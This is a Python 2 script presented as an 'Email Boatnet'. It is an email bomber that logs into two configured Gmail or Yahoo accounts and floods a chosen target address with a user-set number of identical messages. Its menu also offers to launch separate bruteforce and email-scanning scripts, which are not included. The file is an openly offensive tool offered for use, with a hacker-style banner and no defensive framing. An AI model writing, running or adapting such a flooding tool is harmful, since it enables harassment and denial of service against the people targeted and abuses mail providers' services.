#!/usr/bin/env python
# -*- coding: utf-8 -*-
#Auth DavidOfficiel
#
#Social ~
#https://www.youtube.com/channel/UCCYfja7u6YFrpoXzfvgS5Kw ~ youtube
#https://github.com/DavidOfficiel ~ Github
#
#Contact ~ irc.theunderground.pw
#
###############~SMTP~#################
# gmail       | smtp.gmail.com
# yahoo       | smtp.mail.yahoo.com
# outlook     | smtp.live.com
# office365   | smtp.office365.com
# orange      | smtp.orange.net
# hotmail     | smtp.live.com
# gmx         | smtp.gmx.com
# o2          | smtp.o2.ie
# at&t        | smtp.att.yahoo.com
# 1&1         | smtp.1and1.com
# comcast     | smtp.comcast.net
# verizon     | outgoing.verizon.net
########################################

import os
import smtplib
import sys
import time


#Config ~ Start
#~

#BOT1###################################################
server = 'gmail' #Gmail/Yahoo
user =   'email@gmail.com' #Your Email
passwd = 'password123' #Your Password
########################################################

#BOT2###################################################
server2 = 'yahoo' #Gmail/Yahoo
user2 =   'email@yahoo.com' #Your Email
passwd2 = 'password123' #Your Password
########################################################

#BOT3###################################################
#To add a bot you will need to add the code we are 
#working a update for auto bot adding!
########################################################

#~
#Config ~ End


#Banner
os.system('clear')
print """\033[1;32m
             \|/
            .-*-         
           / /|\         
          _L_            
        ,"   ".        ~ Im Coming!  
    (\ /  O O  \ /)      
     \|    _    |/       ~ Your Emails are invaded
       \  (_)  /         
       _/.___,\_        ~ Natrual Flooding 
      (_/     \_) 
        \033[1;m"""
print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~" 
print " ~Codename : David"                                                                                                                                 
print " ~Version  : 1.0.0"       
print " ~Use      : Email Boatnet"                                                                                                                                            
print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~" 
print ""
print ""
time.sleep(3)


yorn = raw_input("\033[1;32mDo you want to bruteforce emails? [y/n]> \033[1;m")
if yorn == 'y':
     os.system('python Bruteforce/option.py')
     sys.exit()
else:
    print ("\033[1;32m\033[1;m")

yorn = raw_input("\033[1;32mDo you want to scan for emails? [y/n]> \033[1;m")
if yorn == 'y':
     os.system('python Scanner/option.py')
     sys.exit()
else:
    print ("\033[1;32m\033[1;m")

time.sleep(1.3)
print"   --=[Loading FrameWork]"
time.sleep(1.3)
os.system('clear')
print " ~~~~~~~~~~~~BOTS~~~~~~~~~~~~~~"
print " 1) email:", user ,"smtp:",server
print " 2) email:", user2 ,"smtp:",server2
print " ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"

#Options
to = raw_input("\033[1;32mroot@root ~$ target:\033[1;m") #The target
body = 'BOMBING EMAILS SINCE 1999!' #email body
total = input('\033[1;32mroot@root ~$ amount:\033[1;m') #The amount

if server == 'gmail':
    smtp_server = 'smtp.gmail.com'
    port = 587
elif server == 'yahoo':
    smtp_server = 'smtp.mail.yahoo.com'
    port = 25
else:
    print 'yahoo et gmail.'
    sys.exit()

print ''

try:
    server = smtplib.SMTP(smtp_server,port)
    server2 = smtplib.SMTP(smtp_server,port)
    server.ehlo()
    server2.ehlo()
    if smtp_server == "smtp.gmail.com":
            server.starttls()
            server2.starttls()
    server.login(user,passwd)
    server2.login(user2,passwd2)
    for i in range(1, total+1):
        subject = os.urandom(9)
        msg = 'From: ' + user + '\nSubject: BOMBING EMAILS SINCE 1999!\n' + body
        server.sendmail(user,to,msg)
        server2.sendmail(user2,to,msg)
        os.system('clear')
        print " ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
        print "\033[1;32m\rTARGET:", to ,"~ SENT: %i" % i 
        print " ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
        sys.stdout.flush()
    server.quit()
except KeyboardInterrupt:
    print 'Good Bye'
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print '\nSomthing went wrong...'
    sys.exit()